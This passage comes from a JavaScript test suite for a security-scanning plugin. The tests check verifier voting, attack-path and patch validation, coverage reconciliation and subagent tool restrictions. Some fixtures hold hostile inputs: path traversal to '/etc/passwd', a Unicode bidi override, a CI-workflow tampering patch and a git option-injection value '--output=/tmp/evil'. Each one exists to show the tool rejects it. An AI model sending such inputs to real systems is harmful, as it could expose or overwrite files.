    { findingId: 'SEC-MITIGATED', lens: 'IMPACT', decision: 'SUPPORTS', reason: 'Database read impact' }
  ];
  const dispMitigated = deriveFinalDisposition(mitigatedCandidate, defensesRefuteVotes, { score: 0.85 });

  if (dispMitigated.disposition !== 'SUPPRESSED' || dispMitigated.mappedVerdict !== 'FALSE_POSITIVE') {
    throw new Error('P1 VIOLATION: DEFENSES mitigation was outvoted 2-to-1 in 3-Lens panel!');
  }
  console.log('✔ 27. P1 Invariant: 3-Lens conjunction prevents defenses from being outvoted 2-to-1.');

  // 28. P1 (0.10.0): 10 Standard Vulnerability Families & Discovery Matrix
  const tmFull = buildThreatModel(process.cwd());
  if (tmFull.inScopeFamilies.length !== 10 || !tmFull.inScopeFamilies.includes('native-memory-safety')) {
    throw new Error('P1 VIOLATION: inScopeFamilies does not include all 10 standard vulnerability families');
  }
  const matrix = generateDiscoveryMatrix(tmFull.components, tmFull.inScopeFamilies);
  if (!Array.isArray(matrix) || matrix.length < 10) {
    throw new Error('P1 VIOLATION: generateDiscoveryMatrix failed to yield full component x family pairings');
  }
  console.log('✔ 28. P1 Invariant: Full 10 vulnerability families and discovery matrix generated.');

  // 29. P2 (0.11.0): Section 21 Attack Path Schema Validation
  const validAttackPath = {
    attackPathId: 'AP-01',
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10, description: 'User controllable argument' },
    steps: [
      { uri: 'skills/3lens/scripts/safe-git.mjs', line: 25, description: 'Command string concatenation' }
    ],
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 40, description: 'Child process invocation' },
    preconditions: ['Local operator execution'],
    exploitabilityPrerequisites: ['Unvalidated input parameters'],
    unmitigatedInvariant: 'No shell escape routine applied'
  };
  const apResult = validateAttackPath(validAttackPath, process.cwd());
  if (!apResult.valid) {
    throw new Error(`P2 VIOLATION: valid attack path failed validation: ${apResult.error}`);
  }
  const traversalAttackPath = {
    ...validAttackPath,
    source: { uri: '../../../etc/passwd', line: 1 }
  };
  const apTraversalResult = validateAttackPath(traversalAttackPath, process.cwd());
  if (apTraversalResult.valid) {
    throw new Error('P2 VIOLATION: Attack path with directory traversal was accepted!');
  }
  console.log('✔ 29. P2 Invariant: Section 21 attack path schema validated fail-closed against traversal.');

  // 30. P2 (0.11.0): Proof-Gap Detection
  const gappyPath = {
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10 },
    steps: [
      { uri: 'skills/3lens/scripts/safe-git.mjs', line: 20, description: 'assumed data propagation' }
    ],
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 30, description: 'sink' }
  };
  const gaps = detectProofGaps(gappyPath);
  if (!gaps.hasGaps || gaps.proofGaps.length < 2) {
    throw new Error('P2 VIOLATION: detectProofGaps failed to flag unproven steps or missing invariants');
  }
  console.log('✔ 30. P2 Invariant: Proof-gap detector flags unproven hops and missing mitigation proofs.');

  // 31. P2 (0.11.0): Multi-Run Candidate Union & Fingerprint Deduplication
  const run1 = [
    { ruleId: 'CWE-89', location: { uri: 'src/api.ts', startLine: 15 }, title: 'SQLi Candidate' },
    { ruleId: 'CWE-79', location: { uri: 'src/view.ts', startLine: 30 }, title: 'XSS Candidate' }
  ];
  const run2 = [
    { ruleId: 'CWE-89', location: { uri: 'src/api.ts', startLine: 15 }, title: 'SQLi Candidate Run 2' },
    { ruleId: 'CWE-78', location: { uri: 'src/exec.ts', startLine: 45 }, title: 'Command Injection' }
  ];
  const unioned = unionCandidates([run1, run2]);
  if (unioned.length !== 3) {
    throw new Error(`P2 VIOLATION: unionCandidates length expected 3, got ${unioned.length}`);
  }
  const sqli = unioned.find(c => c.ruleId === 'CWE-89');
  if (!sqli || sqli.recurrenceCount !== 2 || sqli.runsObserved.length !== 2) {
    throw new Error('P2 VIOLATION: Multi-run candidate union failed recurrence tracking');
  }
  console.log('✔ 31. P2 Invariant: Multi-run candidate union deduplicates candidates and tracks recurrence.');

  // 32. P2 (0.11.0): Unclosed Proof Gap Forces DEFERRED Under Default-Deny
  const candidateWithProofGaps = {
    id: 'SEC-GAP-01',
    ruleId: 'CWE-89',
    title: 'Candidate with Gap',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 },
    proofGaps: [{ stepIndex: 1, unprovenProperty: 'Control flow branch cannot be proven reachable' }]
  };
  const threeLensVotesWithGaps = [
    { findingId: 'SEC-GAP-01', lens: 'REACHABILITY', decision: 'SUPPORTS' },
    { findingId: 'SEC-GAP-01', lens: 'DEFENSES', decision: 'SUPPORTS' },
    { findingId: 'SEC-GAP-01', lens: 'IMPACT', decision: 'SUPPORTS' }
  ];
  const dispGaps = deriveFinalDisposition(candidateWithProofGaps, threeLensVotesWithGaps, { score: 1.0 });
  if (dispGaps.disposition !== 'DEFERRED' || dispGaps.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('P2 VIOLATION: Candidate with unclosed proof gaps was not forced to DEFERRED!');
  }
  console.log('✔ 32. P2 Invariant: Unclosed proof gaps strictly force DEFERRED disposition.');

  // 33. P2 (0.11.0): Fingerprint Delimiter Collision Resistance
  const fpA = computeFindingFingerprint('semgrep:rules', 'xss/api.ts', 10);
  const fpB = computeFindingFingerprint('semgrep', 'rules:xss/api.ts', 10);
  if (fpA === fpB) {
    throw new Error('P2 VIOLATION: computeFindingFingerprint collided on colon delimiter!');
  }
  console.log('✔ 33. P2 Invariant: Length-prefixed fingerprint generation is collision-resistant.');

  // 34. P2 (0.11.0): Automatic Proof-Gap Integration in finalizeScan
  const candidateWithUnprovenPath = {
    id: 'SEC-AUTO-GAP',
    ruleId: 'CWE-89',
    title: 'SQLi Candidate with Unverified Hop',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 15 },
    attackPath: {
      source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10, description: 'Incoming query parameter' },
      steps: [
        { uri: 'skills/3lens/scripts/safe-git.mjs', line: 12, description: 'assumed unvalidated string concatenation' }
      ],
      sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 15, description: 'Executed SQL query' },
      unmitigatedInvariant: 'No parameterized query'
    }
  };
  const threeVotes = [
    { findingId: 'SEC-AUTO-GAP', lens: 'REACHABILITY', decision: 'SUPPORTS' },
    { findingId: 'SEC-AUTO-GAP', lens: 'DEFENSES', decision: 'SUPPORTS' },
    { findingId: 'SEC-AUTO-GAP', lens: 'IMPACT', decision: 'SUPPORTS' }
  ];
  const finalizationWithGap = finalizeScan({
    candidates: [candidateWithUnprovenPath],
    votes: threeVotes,
    repoRoot: process.cwd()
  });
  const canonicalFindingWithGap = finalizationWithGap.canonicalFindings[0];
  if (canonicalFindingWithGap.disposition !== 'DEFERRED' || canonicalFindingWithGap.verdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('P2 VIOLATION: Attack path with unproven hop leaked into CONFIRMED in finalizeScan!');
  }
  if (!Array.isArray(canonicalFindingWithGap.proofGaps) || canonicalFindingWithGap.proofGaps.length === 0) {
    throw new Error('P2 VIOLATION: proofGaps were not retained on canonical finding!');
  }
  console.log('✔ 34. P2 Invariant: finalizeScan automatically detects proof gaps and enforces DEFERRED under Default-Deny.');

  // 35. P2 (0.12.0): Unified Diff Patch Syntax & Traversal Defense
  const validPatch = `--- a/skills/3lens/scripts/safe-git.mjs
+++ b/skills/3lens/scripts/safe-git.mjs
@@ -10,2 +10,3 @@
 const hardened = true;
+const verified = true;
`;
  const patchVal = validatePatchSyntax(validPatch, process.cwd());
  if (!patchVal.valid || patchVal.targetFiles.length !== 1) {
    throw new Error(`P2 VIOLATION: valid patch failed validation: ${patchVal.error}`);
  }
  const traversalPatch = `--- a/../../../../etc/passwd
+++ b/../../../../etc/passwd
@@ -1,1 +1,2 @@
+malicious line
`;
  const traversalVal = validatePatchSyntax(traversalPatch, process.cwd());
  if (traversalVal.valid) {
    throw new Error('P2 VIOLATION: Patch containing directory traversal was accepted!');
  }
  console.log('✔ 35. P2 Invariant: Patch syntax validated fail-closed against directory traversal.');

  // 36. P2 (0.12.0): Stale Baseline Detection
  const staleCheck = detectStalePatch(gitFixture.repoPath, ['skills/3lens/scripts/safe-git.mjs'], 'HEAD');
  if (staleCheck.stale !== false) {
    throw new Error('P2 VIOLATION: Clean baseline falsely marked as stale');
  }
  console.log('✔ 36. P2 Invariant: Stale baseline check safely inspects target file divergence.');

  // 37. P1-03: Remediation Verification strictly requires complete 3-Lens panel under Default-Deny
  const findingToVerify = {
    id: 'SEC-REMED',
    ruleId: 'CWE-89',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 25 }
  };

  // 37.1 1 DEFENSES only -> REJECTED
  const defensesOnlyVotes = [
    { findingId: 'SEC-REMED', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:25', mitigationReason: 'Parameterized query barrier added' }
  ];
  const defOnlyResult = verifyRemediation(findingToVerify, defensesOnlyVotes, process.cwd());
  if (defOnlyResult.verified) {
    throw new Error('P1-03 VIOLATION: Single DEFENSES vote alone certified remediation without REACHABILITY and IMPACT!');
  }

  // 37.2 DEFENSES + REACHABILITY only -> REJECTED
  const defAndReachVotes = [
    { findingId: 'SEC-REMED', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:25', mitigationReason: 'Parameterized query barrier added' },
    { findingId: 'SEC-REMED', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'Exploit path blocked', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'dead-path' }] }
  ];
  const defAndReachResult = verifyRemediation(findingToVerify, defAndReachVotes, process.cwd());
  if (defAndReachResult.verified) {
    throw new Error('P1-03 VIOLATION: Missing IMPACT vote certified remediation!');
  }

  // 37.3 All 3 valid -> VERIFIED
  const allThreeVotes = [
    {
      findingId: 'SEC-REMED',
      lens: 'DEFENSES',
      decision: 'REFUTES',
      mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:25',
      mitigationReason: 'Parameterized query barrier added',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'guard' }]
    },
    {
      findingId: 'SEC-REMED',
      lens: 'REACHABILITY',
      decision: 'REFUTES',
      reason: 'Exploit path blocked',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'dead-path' }]
    },
    {
      findingId: 'SEC-REMED',
      lens: 'IMPACT',
      decision: 'REFUTES',
      reason: 'Impact neutralized',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'impact-boundary' }]
    }
  ];
  const remediationResult = verifyRemediation(findingToVerify, allThreeVotes, process.cwd());
  if (!remediationResult.verified) {
    throw new Error(`P1-03 VIOLATION: Complete 3-lens panel failed to certify remediation: ${remediationResult.reason}`);
  }

  // 37.4 Unresolved reachability / impact evidence (e.g. REACHABILITY SUPPORTS) -> REJECTED
  const unverifiedResult = verifyRemediation(findingToVerify, [
    { findingId: 'SEC-REMED', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:25', mitigationReason: 'Parameterized query barrier added' },
    { findingId: 'SEC-REMED', lens: 'REACHABILITY', decision: 'SUPPORTS', reason: 'Bypass found' },
    { findingId: 'SEC-REMED', lens: 'IMPACT', decision: 'REFUTES', reason: 'Impact neutralized' }
  ], process.cwd());
  if (unverifiedResult.verified) {
    throw new Error('P1-03 VIOLATION: Unverified remediation was incorrectly certified!');
  }
  console.log('✔ 37. P1-03 Invariant: Remediation verification strictly requires complete 3-Lens panel under Default-Deny.');

  // 38. P2 (0.12.0): Patch Jail Security Rules (Bidi, CI/CD, Multi-file)
  const bidiPatch = `--- a/skills/3lens/scripts/safe-git.mjs
+++ b/skills/3lens/scripts/safe-git.mjs
@@ -10,1 +10,1 @@
-const access = false;
+const access = true; \u202E /* hidden override */
`;
  const bidiVal = validatePatchSyntax(bidiPatch, process.cwd());
  if (bidiVal.valid) {
    throw new Error('P2 VIOLATION: Patch with Unicode Bidi character was accepted!');
  }

  const cicdPatch = `--- a/.github/workflows/audit.yml
+++ b/.github/workflows/audit.yml
@@ -1,1 +1,2 @@
+tampered
`;
  const cicdVal = validatePatchSyntax(cicdPatch, process.cwd());
  if (cicdVal.valid) {
    throw new Error('P2 VIOLATION: Patch tampering with CI/CD was accepted!');
  }
  console.log('✔ 38. P2 Invariant: Patch Jail strictly rejects Unicode Bidi and CI/CD modifications.');

  // 39. P2 (0.12.0): Option Injection Defense in detectStalePatch
  const optionInjectionCheck = detectStalePatch(gitFixture.repoPath, ['skills/3lens/scripts/safe-git.mjs'], '--output=/tmp/evil');
  if (!optionInjectionCheck.stale || !optionInjectionCheck.error) {
    throw new Error('P2 VIOLATION: Unsafe baseRevision option injection was not rejected fail-closed!');
  }
  console.log('✔ 39. P2 Invariant: detectStalePatch rejects CLI option injection fail-closed.');


  // 40. P2 (0.12.0) & P1-03: 3-Lens Finding ID Binding and Unresolved Reachability / Impact Evidence
  const candidateA = { id: 'SEC-100', location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 20 } };
  const candidateB = { id: 'SEC-200', location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 20 } };
  const votesForA = [
    {
      findingId: 'SEC-100',
      lens: 'DEFENSES',
      decision: 'REFUTES',
      mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:20',
      mitigationReason: 'Sanitizer installed',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20, role: 'guard' }]
    },
    {
      findingId: 'SEC-100',
      lens: 'REACHABILITY',
      decision: 'REFUTES',
      reason: 'Unreachable',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20, role: 'dead-path' }]
    },
    {
      findingId: 'SEC-100',
      lens: 'IMPACT',
      decision: 'REFUTES',
      reason: 'Zero harm',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20, role: 'impact-boundary' }]
    }
  ];
  // Ballots for A must verify candidate A
  const candidateAVerified = verifyRemediation(candidateA, votesForA, process.cwd());
  if (!candidateAVerified.verified) {
    throw new Error('P1-03 VIOLATION: Valid 3-lens ballots for Candidate A failed verification!');
  }
  // Ballots for A must not verify candidate B
  const crossBindingCheck = verifyRemediation(candidateB, votesForA, process.cwd());
  if (crossBindingCheck.verified) {
    throw new Error('P2 VIOLATION: Ballots for Finding A verified Finding B!');
  }

  // Reachability + Impact dissent blocks certification
  const dissentedVotes = [
    {
      findingId: 'SEC-100',
      lens: 'DEFENSES',
      decision: 'REFUTES',
      mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:20',
      mitigationReason: 'Sanitizer installed',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20, role: 'guard' }]
    },
    { findingId: 'SEC-100', lens: 'REACHABILITY', decision: 'SUPPORTS', justification: 'Bypass found' },
    { findingId: 'SEC-100', lens: 'IMPACT', decision: 'SUPPORTS', justification: 'Critical data loss' }
  ];
  const dissentCheck = verifyRemediation(candidateA, dissentedVotes, process.cwd());
  if (dissentCheck.verified) {
    throw new Error('P2 VIOLATION: Patch was certified despite REACHABILITY and IMPACT unresolved reachability/impact evidence!');
  }
  console.log('✔ 40. P2 Invariant: Fix verification enforces finding identity and 3-lens consensus.');

  // 41. P0-01 Hardening: Fake consensus without ballots is strictly DEFERRED (Default-Deny)
  const fakeConsensusCandidate = {
    id: 'C-FAKE-CONSENSUS',
    location: { uri: 'src/auth.ts', startLine: 10 },
    sourceVerified: true,
    consensus: {
      totalVotes: 3,
      unanimous: true
    }
  };
  const fakeConsensusResult = deriveFinalDisposition(fakeConsensusCandidate, [], { score: 0.85 });
  if (fakeConsensusResult.disposition !== 'DEFERRED' || fakeConsensusResult.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error(`P0-01 VIOLATION: Candidate self-asserted consensus was accepted without ballots: ${JSON.stringify(fakeConsensusResult)}`);
  }
  // End-to-end pipeline test: verify finalizeScan strips raw.consensus
  const fakePipelineRes = finalizeScan({ candidates: [fakeConsensusCandidate], manifest: validManifest });
  const totalRecorded = Number(fakePipelineRes.canonicalFindings[0].consensus.total ?? fakePipelineRes.canonicalFindings[0].consensus.totalVotes ?? 0);
  if (fakePipelineRes.canonicalFindings[0].disposition !== 'DEFERRED' || totalRecorded !== 0) {
    throw new Error(`P0-01 VIOLATION: finalizeScan leaked self-asserted consensus: ${JSON.stringify(fakePipelineRes.canonicalFindings[0].consensus)}`);
  }

  console.log('✔ 41. P0-01 Invariant: Fake consensus without independent ballots is strictly DEFERRED.');

  // 42. P0-01 Hardening: Fake raw evidence flags with maximum rigor without ballots is strictly DEFERRED
  const fakeRawFlagsCandidate = {
    id: 'C-FAKE-FLAGS',
    location: { uri: 'src/auth.ts', startLine: 10 },
    sourceVerified: true,
    dataflowVerified: true
  };
  const fakeFlagsResult = deriveFinalDisposition(fakeRawFlagsCandidate, [], { score: 1.0 });
  if (fakeFlagsResult.disposition !== 'DEFERRED' || fakeFlagsResult.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error(`P0-01 VIOLATION: Candidate raw flags were accepted without ballots even at score 1.0: ${JSON.stringify(fakeFlagsResult)}`);
  }
  console.log('✔ 42. P0-01 Invariant: Candidate raw flags without independent ballots is strictly DEFERRED.');

  // 43. P0-01 Hardening: Real task-bound ballots required for REPORTABLE
  const realBallotCandidate = {
    id: 'C-REAL-BALLOTS',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 }
  };
  const realBallots = [
    {
      findingId: 'C-REAL-BALLOTS',
      reviewerId: 'rev-1',
      decision: 'CONFIRMED',
      evidence: [
        { path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'source' },
        { path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'sink' }
      ]
    },
    {
      findingId: 'C-REAL-BALLOTS',
      reviewerId: 'rev-2',
      decision: 'CONFIRMED',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 15, role: 'control' }]
    }
  ];
  const realResult = deriveFinalDisposition(realBallotCandidate, realBallots, { score: 0.85 }, process.cwd());
  if (realResult.disposition !== 'REPORTABLE' || !realResult.authoritativeRigor || realResult.authoritativeRigor.score < 0.6) {
    throw new Error(`P0-01 VIOLATION: Valid ballots with evidence sufficiency failed to achieve REPORTABLE: ${JSON.stringify(realResult)}`);
  }
  console.log('✔ 43. P0-01 Invariant: Real task-bound ballots required to transition to REPORTABLE.');


  // 44. P0-01 Hardening: Unassigned ballots cannot bind via isSingleCandidate & null safety
  const unassignedBallot = [{ reviewerId: 'rev-1', decision: 'CONFIRMED' }];
  const multiCandidateA = { id: 'C-A', location: { uri: 'src/auth.ts', startLine: 10 }, isSingleCandidate: true };
  const nullVotesRes = deriveFinalDisposition(multiCandidateA, null);
  if (nullVotesRes.disposition !== 'DEFERRED') {
    throw new Error('P0-01 VIOLATION: Null votes did not default-deny to DEFERRED');
  }
  const unassignedRes = deriveFinalDisposition(multiCandidateA, unassignedBallot);
  if (unassignedRes.disposition !== 'DEFERRED') {
    throw new Error('P0-01 VIOLATION: Unassigned ballot bound to candidate via isSingleCandidate property');
  }
  console.log('✔ 44. P0-01 Invariant: Strict task-binding prevents unassigned ballot leakage.');

  // 45. P0-02 Invariant: Omitted directory results in PARTIAL coverage (Test A)
  const fullFsManifest = buildDirectoryManifest(process.cwd());
  const omittedEntries = fullFsManifest.entries.filter(e => normalizeDirectoryPath(e.path) !== 'skills/');
  const omittedScanManifest = { entries: omittedEntries };
  const omittedRes = reconcileCoverage(omittedScanManifest, process.cwd());
  if (omittedRes.status === 'COMPLETE' || !omittedRes.missing.includes('skills/')) {
    throw new Error(`P0-02 VIOLATION: Omitted directory skills/ was not detected as PARTIAL: ${JSON.stringify(omittedRes)}`);
  }
  console.log('✔ 45. P0-02 Invariant: Omitted directory results in PARTIAL coverage with missing list.');

  // 46. P0-02 Invariant: Fake complete manifest ({ entries: [{ path: './' }] }) cannot achieve COMPLETE (Test B)
  const fakeCompleteManifest = {
    entries: [
      { path: './', status: 'SCANNED' }
    ]
  };
  const fakeScanRes = finalizeScan({ candidates: [], manifest: fakeCompleteManifest, repoRoot: process.cwd() });
  if (fakeScanRes.coverageStatus === 'COMPLETE' || fakeScanRes.canDeclareClean) {
    throw new Error(`P0-02 VIOLATION: Fake manifest claimed COMPLETE coverage or declared clean: ${JSON.stringify(fakeScanRes)}`);
  }
  console.log('✔ 46. P0-02 Invariant: Fake complete manifest is rejected as PARTIAL under filesystem reconciliation.');

  // 47. P0-02 Invariant: Review mode missing changed file results in PARTIAL (Test C)
  const realDiffFor47 = extractChangedFiles(gitFixture.repoPath, { base: 'HEAD~1', head: 'HEAD' });
  const partialChangedList = realDiffFor47.changedFiles.slice(1);
  const partialReviewManifest = {
    mode: 'review',
    base: 'HEAD~1',
    head: 'HEAD',
    reviewInventory: {
      changedFiles: partialChangedList,
      deletedFiles: realDiffFor47.deletedFiles
    }
  };
  const partialReviewRes = reconcileCoverage(partialReviewManifest, gitFixture.repoPath);
  if (partialReviewRes.status === 'COMPLETE' || partialReviewRes.missingChanged.length === 0) {
    throw new Error(`P0-02 VIOLATION: Review manifest missing changed files was accepted as COMPLETE: ${JSON.stringify(partialReviewRes)}`);
  }
  console.log('✔ 47. P0-02 Invariant: Review mode missing changed file rejected as PARTIAL.');

  // 48. P0-02 Invariant: Review mode fake/missing deleted file (Test D)
  const fakeDeletedManifest = {
    mode: 'review',
    base: 'HEAD~1',
    head: 'HEAD',
    reviewInventory: {
      changedFiles: realDiffFor47.changedFiles,
      deletedFiles: [{ path: 'unaccounted-fake-deleted.js', status: 'DELETED' }]
    }
  };
  const fakeDeletedRes = reconcileCoverage(fakeDeletedManifest, gitFixture.repoPath);
  if (fakeDeletedRes.status === 'COMPLETE' || fakeDeletedRes.unexpectedDeleted.length === 0) {
    throw new Error(`P0-02 VIOLATION: Review manifest with fictitious deleted file was accepted as COMPLETE: ${JSON.stringify(fakeDeletedRes)}`);
  }
  console.log('✔ 48. P0-02 Invariant: Review mode deleted file discrepancy rejected as PARTIAL.');

  // 49. P0-02 Hardening: Null or non-existent repoRoot strictly fails closed to UNCHECKABLE

  const nullRootRes = finalizeScan({ candidates: [], manifest: fullFsManifest, repoRoot: null });
  if (nullRootRes.coverageStatus !== 'UNCHECKABLE' || nullRootRes.canDeclareClean) {
    throw new Error(`P0-02 VIOLATION: Null repoRoot did not fail closed to UNCHECKABLE: ${JSON.stringify(nullRootRes)}`);
  }
  const nonExistentRes = finalizeScan({ candidates: [], manifest: fullFsManifest, repoRoot: '/path/does/not/exist' });
  if (nonExistentRes.coverageStatus !== 'UNCHECKABLE' || nonExistentRes.canDeclareClean) {
    throw new Error(`P0-02 VIOLATION: Non-existent repoRoot did not fail closed to UNCHECKABLE: ${JSON.stringify(nonExistentRes)}`);
  }
  console.log('✔ 49. P0-02 Invariant: Null or non-existent repoRoot strictly fails closed to UNCHECKABLE.');

  // 50. P0-02 Hardening: False Exclusion / Categorization Fabrication is rejected as PARTIAL
  const falseExclusionEntries = fullFsManifest.entries.map(e => {
    if (normalizeDirectoryPath(e.path) === 'skills/') {
      return { ...e, status: 'EXCLUDED_VENDORED', reason: 'Fictitious vendor exclusion' };
    }
    return e;
  });
  const falseExclusionManifest = { entries: falseExclusionEntries };
  const falseExclusionRes = finalizeScan({ candidates: [], manifest: falseExclusionManifest, repoRoot: process.cwd() });
  if (falseExclusionRes.coverageStatus === 'COMPLETE' || falseExclusionRes.canDeclareClean) {
    throw new Error(`P0-02 VIOLATION: False exclusion of skills/ was accepted as COMPLETE: ${JSON.stringify(falseExclusionRes)}`);
  }
  console.log('✔ 50. P0-02 Invariant: False exclusion of core source directories is rejected as PARTIAL.');

  // 51. P0-02 Hardening: Review mode identical base/head revision manipulation rejected as PARTIAL
  const identicalRevManifest = {
    mode: 'review',
    base: 'HEAD',
    head: 'HEAD',
    reviewInventory: { changedFiles: [], deletedFiles: [] }
  };
  const identicalRevRes = finalizeScan({ candidates: [], manifest: identicalRevManifest, repoRoot: gitFixture.repoPath });
  if (identicalRevRes.coverageStatus === 'COMPLETE' || identicalRevRes.canDeclareClean) {
    throw new Error(`P0-02 VIOLATION: Identical review revisions (HEAD...HEAD) accepted as COMPLETE: ${JSON.stringify(identicalRevRes)}`);
  }
  console.log('✔ 51. P0-02 Invariant: Identical base/head revision manipulation rejected as PARTIAL.');


  // 52. P0-03 Invariant: loadVotes loads votes from single JSON file and nested ballot directories
  const tmpVotesDir = path.join(process.cwd(), 'scratch', 'test-votes-dir');
  const tmpSubDir = path.join(tmpVotesDir, 'SEC-001');
  fs.mkdirSync(tmpSubDir, { recursive: true });
  fs.writeFileSync(path.join(tmpSubDir, 'ballot_1.json'), JSON.stringify([{ findingId: 'F-1', reviewerId: 'r1', decision: 'CONFIRMED' }]));
  fs.writeFileSync(path.join(tmpVotesDir, 'ballot_2.json'), JSON.stringify({ findingId: 'F-1', reviewerId: 'r2', decision: 'CONFIRMED' }));
  const loadedDirVotes = loadVotes(tmpVotesDir);
  if (loadedDirVotes.length !== 2 || !loadedDirVotes.some(v => v.reviewerId === 'r1') || !loadedDirVotes.some(v => v.reviewerId === 'r2')) {
    throw new Error(`P0-03 VIOLATION: loadVotes failed to load votes from nested directory: ${JSON.stringify(loadedDirVotes)}`);
  }

  try {
    fs.rmSync(tmpVotesDir, { recursive: true, force: true });
  } catch {}
  console.log('✔ 52. P0-03 Invariant: loadVotes correctly aggregates ballots from files and directories.');

  // 53. P0-03 Invariant: Canonical pipeline renders canonical findings without making disposition decisions.
  const preFinalizedCanonical = [
    {
      id: 'CANON-001',
      ruleId: 'CWE-89',
      title: 'Pre-finalized SQLi',
      severity: 'CRITICAL',
      cvssV4: { vector: validVector, score: 9.3, severity: 'CRITICAL' },
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 42, endLine: 44, lineSnippet: 'SELECT' },
      consensus: { supports: 2, total: 2, unanimous: true },
      rigor: { score: 0.85, assuranceLevel: 'HIGH_RIGOR' },
      disposition: 'REPORTABLE',
      verdict: 'CONFIRMED',
      confidenceScore: 0.9,
      confidenceLevel: 'high'
    }
  ];
  const canonicalSarifOutput = renderSarifFromCanonical({
    canonicalFindings: preFinalizedCanonical,
    manifest: fullFsManifest,
    coverageStatus: 'COMPLETE',
    repoRoot: process.cwd()
  });
  if (canonicalSarifOutput.runs[0].results.length !== 1 || canonicalSarifOutput.runs[0].results[0].properties.disposition !== 'REPORTABLE') {
    throw new Error('P0-03 VIOLATION: renderSarifFromCanonical altered disposition of canonical findings');
  }
  console.log('✔ 53. P0-03 Invariant: Canonical pipeline renders canonical findings without making disposition decisions.');

  // 54. P0-03 Invariant: Production rendering without votes strictly produces DEFERRED findings (Zero-Vote Default-Deny)
  const unvotedCandidates = [
    {
      id: 'UNVOTED-001',
      ruleId: 'CWE-89',
      title: 'Unvoted SQL Injection',
      severity: 'HIGH',
      location: { uri: 'src/auth.ts', startLine: 42, endLine: 44 }
    }
  ];
  const renderedWithoutVotes = renderSarif({
    findings: unvotedCandidates,
    manifest: fullFsManifest,
    votes: [], // Zero votes
    repoRoot: process.cwd()
  });
  if (renderedWithoutVotes.runs[0].results.length > 0 && renderedWithoutVotes.runs[0].results[0].properties.disposition === 'REPORTABLE') {
    throw new Error('P0-03 VIOLATION: Finding without votes was rendered as REPORTABLE!');
  }
  console.log('✔ 54. P0-03 Invariant: Production rendering without votes strictly enforces DEFERRED disposition.');

  // 55. P0-04 Invariant: Custom agents located at plugin root with hardened capability declarations
  const expectedAgents = [
    'agents/threat-modeler.md',
    'agents/discovery-agent.md',
    'agents/verifier-reachability.md',
    'agents/verifier-defenses.md',
    'agents/verifier-impact.md'
  ];
  for (const af of expectedAgents) {
    const fullP = path.resolve(process.cwd(), af);
    if (!fs.existsSync(fullP)) {
      throw new Error(`P0-04 VIOLATION: Expected agent missing from plugin root: ${af}`);
    }
    const content = fs.readFileSync(fullP, 'utf8');
    if (!content.includes('mainAgent: false') || !content.includes('subagent: true') || !content.includes('commandExecutionPolicy: off')) {
      throw new Error(`P0-04 VIOLATION: Agent ${af} missing mandatory capability constraints`);
    }
    if (content.includes('read_file')) {
      throw new Error(`P0-04 VIOLATION: Agent ${af} uses invalid tool name 'read_file'; must be 'view_file'`);
    }
    if (content.includes('run_command') || content.includes('write_to_file') || content.includes('replace_file_content')) {
      throw new Error(`P0-04 VIOLATION: Agent ${af} has prohibited execution/modifying tools`);
    }
    if (/(?:^|\n)\s*permissions\s*:/i.test(content)) {
      throw new Error(`R1-P2-03 VIOLATION: Agent ${af} declares unofficial permissions block`);
    }
    const toolMatch = content.match(/tools:\s*\n((?:\s*-\s*[a-zA-Z0-9_]+\s*\n)+)/);
    if (toolMatch) {
      const declaredTools = toolMatch[1].split('\n')
        .map(l => l.replace(/^\s*-\s*/, '').trim())
        .filter(Boolean);
      const allowedTools = new Set(['view_file', 'list_dir', 'grep_search', 'find_by_name']);
      for (const t of declaredTools) {
        if (!allowedTools.has(t)) {
          throw new Error(`P0-04 VIOLATION: Agent ${af} declares non-whitelisted tool '${t}'`);
        }
      }
    }
  }
  if (!categorizeDirectory('agents').status.startsWith('SCANNED')) {
    throw new Error('P0-04 VIOLATION: agents/ directory must be categorized as SCANNED');
  }
  console.log('✔ 55. P0-04 Invariant: Custom agents located at plugin root with verified least-privilege capabilities.');

  // 56. P1-01 Invariant: Strict fail-closed score boundaries (no clamping, reject out-of-bounds, no fabricated score)
  const score99Res = validateCvssV4({ vector: validVector, score: 99 });
  if (score99Res.valid || score99Res.score !== null) {
